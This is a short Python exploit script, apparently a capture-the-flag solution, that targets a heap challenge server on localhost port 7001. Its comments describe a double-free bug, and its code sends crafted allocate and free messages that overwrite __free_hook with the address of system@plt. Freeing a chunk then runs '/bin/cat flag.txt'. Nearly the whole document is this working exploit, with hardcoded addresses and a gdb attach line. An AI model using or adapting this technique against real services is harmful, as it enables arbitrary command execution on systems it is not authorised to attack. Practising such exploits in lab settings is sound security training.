import sys
from struct import pack
from pwn import *
import socket

#COMMANDS 
ALLOC   = b'a'
DEALLOC = b'd'
ONE		= 0x01.to_bytes(1, 'little')
TWO		= 0x02.to_bytes(1, 'little')
THREE	= 0x03.to_bytes(1, 'little')
FOUR 	= 0x04.to_bytes(1, 'little')
RC 		= b"\n"
READLEN = 31
# there is a double free vulnerability: it is possible to call twice deletekey() on the
# same pointer.


# given that RELRO is enabled got entries cannot be overwritten, so the aim of the attack
# is __free_hook. After the attack __free_hook will contain the address of system@plt,  
# the argument
cmd 			= b"/bin/cat flag.txt "
free_hook_addr 	= 0x605f10
system_plt 		= 0x400e08 
s = socket.create_connection(("localhost",7001))
s.send(ALLOC + ONE + b"B"*READLEN)
s.send(DEALLOC + ONE)
s.send(DEALLOC + ONE)
s.send(ALLOC + TWO   + free_hook_addr.to_bytes(8, 'little', signed=False) + RC*23)
s.send(ALLOC + THREE + cmd + RC*(READLEN - len(cmd)))
s.send(ALLOC + FOUR  + system_plt.to_bytes(8, 'little', signed=False)  + RC*23)
s.send(DEALLOC + THREE)
print(s.recv(512).decode('ascii'))
s.close()

#sudo gdb server_1 --pid=$(pidof server_1) --nx -x init.gdb
